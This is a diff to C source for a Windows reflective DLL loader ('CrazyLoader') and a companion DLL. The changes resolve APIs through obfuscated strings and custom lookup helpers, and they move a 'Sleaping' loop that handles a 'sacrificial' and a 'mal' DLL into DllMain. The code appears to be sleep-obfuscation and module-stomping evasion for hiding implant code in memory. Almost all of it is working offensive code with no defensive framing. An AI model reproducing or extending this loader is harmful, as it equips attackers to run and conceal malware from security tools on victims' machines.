@@ -462,6 +462,12 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
 //IMPLEMENTED FOR YOLO LOADER 
 EXTERN_DLL_EXPORT bool CrazyLoader() {
 
+    WCHAR kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
+    CHAR createThread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d','\0' };
+	fnCreateThread CT = NULL;
+	if ((CT = (fnCreateThread)GPAR(GMHR(kernel32), createThread)) == NULL)
+		return FALSE;
+
     fnDllMain pDllMain = NULL;
     PBYTE pebase = NULL;
     PIMAGE_DOS_HEADER	pImgDosHdr = NULL;
@@ -522,7 +528,13 @@ EXTERN_DLL_EXPORT bool CrazyLoader() {
     
     //execute the entry point
     pDllMain = (fnDllMain)(pebase + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
-    return pDllMain((HMODULE)pebase, DLL_PROCESS_ATTACH, NULL);
+
+	HANDLE hThread = CT(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc, (LPVOID)pDllMain, 0, NULL);
+	if (hThread == NULL)
+		return FALSE;
+
+	return TRUE;
+    //return pDllMain((HMODULE)pebase, DLL_PROCESS_ATTACH, NULL);
    
 }
 
@@ -584,36 +596,6 @@ bool InitializeNtFunctions(PNT_FUNCTIONS ntFunctions)
     return true;
 }
 
-VOID CoreFunction(LPVOID lpParam) {
-
-    PCORE_ARGUMENTS CoreArguments = NULL;
-    CoreArguments = (PCORE_ARGUMENTS)lpParam;
-	
-    //here i need to initialize all the NtFunctions 
-	PNT_FUNCTIONS ntFunctions = (PNT_FUNCTIONS)VirtualAlloc(NULL, sizeof(NT_FUNCTIONS), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!InitializeNtFunctions(ntFunctions))
-    {
-        return;
-    }
-    PFUNCTION_ADDRESSES fnAddr = (PFUNCTION_ADDRESSES) VirtualAlloc(NULL, sizeof(FUNCTION_ADDRESSES), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!InitializeFunctionAddress(fnAddr)) {
-        
-        return;
-    }
-
-    //looping and Sleaping <3
-    do {
-        MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
-        if (Sleaping(CoreArguments->myBase, CoreArguments->sacDLLHandle, CoreArguments->malDLLHandle, CoreArguments->viewSize, ntFunctions, fnAddr) == -1) {
-            //nightmares
-            MessageBoxA(NULL, "Sleaping", "With Nightmares", MB_OK | MB_ICONINFORMATION);
-            return;
-        }
-
-
-    } while (TRUE);
-
-}
 
 
 BOOL APIENTRY DllMain( HMODULE hModule,
@@ -632,11 +614,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
         //even if unampped it's in the PEB
         PBYTE myBase = (PBYTE)GetModuleHandleA("SRH.dll");
 
-        //get handle to NTDLL
-        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-		if (hNtdll == NULL) {
-			return FALSE;
-		}
+        
 
         //retrieve the information left from the reflective loader
         //retrieve handle of sac dll
@@ -662,21 +640,49 @@ BOOL APIENTRY DllMain( HMODULE hModule,
             return FALSE;
         }
         
-
-        PCORE_ARGUMENTS CoreArguments = (PCORE_ARGUMENTS)VirtualAlloc(NULL, sizeof(CORE_ARGUMENTS), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        CoreArguments->myBase = myBase;
-        CoreArguments->sacDLLHandle = sacDllHandle;
-        CoreArguments->malDLLHandle = malDllHandle;
-        CoreArguments->viewSize = viewSize;
-        
-        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CoreFunction, CoreArguments, 0, NULL);
-
-        if (hThread != NULL) {
-			
-            //saying goodbye to the loader thread
-            ExitThread(0);
+        //here i need to initialize all the NtFunctions 
+        NT_FUNCTIONS ntFunctions = {0};
+        if (!InitializeNtFunctions(&ntFunctions))
+        {
+            return FALSE;
         }
+        
 
+        // handle to ntdll and user32
+        HMODULE hNtdll = { 0 };
+        HMODULE hUser32 = { 0 };
+        HMODULE hKernel32 = { 0 };
+        if (!(hNtdll = GetModuleHandleA("ntdll"))) {
+            return FALSE;
+        }
+        if (!(hUser32 = GetModuleHandleA("user32.dll"))) {
+            return FALSE;
+        }
+        if (!(hKernel32 = GetModuleHandleA("kernel32.dll"))) {
+            return FALSE;
+        }
+        // function pointers for thread contexts
+        PVOID NtTestAlertAddress = GetProcAddress(hNtdll, "NtTestAlert");
+        PVOID NtWaitForSingleObjectAddress = GetProcAddress(hNtdll, "NtWaitForSingleObject");
+        PVOID MessageBoxAddress = GetProcAddress(hUser32, "MessageBoxA");
+        PVOID ResumeThreadAddress = GetProcAddress(hKernel32, "ResumeThread");
+
+		if (NtTestAlertAddress == NULL || NtWaitForSingleObjectAddress == NULL || MessageBoxAddress == NULL || ResumeThreadAddress == NULL) {
+			return FALSE;
+		}
+        //looping and Sleaping <3
+        do {
+            MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
+            if (Sleaping(myBase, sacDllHandle, malDllHandle, viewSize, &ntFunctions, ResumeThreadAddress, NtTestAlertAddress, MessageBoxAddress, NtWaitForSingleObjectAddress) == -1) {
+                //nightmares
+                MessageBoxA(NULL, "Sleaping", "With Nightmares", MB_OK | MB_ICONINFORMATION);
+                return FALSE;
+            }
+
+
+        } while (TRUE);
+
+        return TRUE;
         
     }
         break;
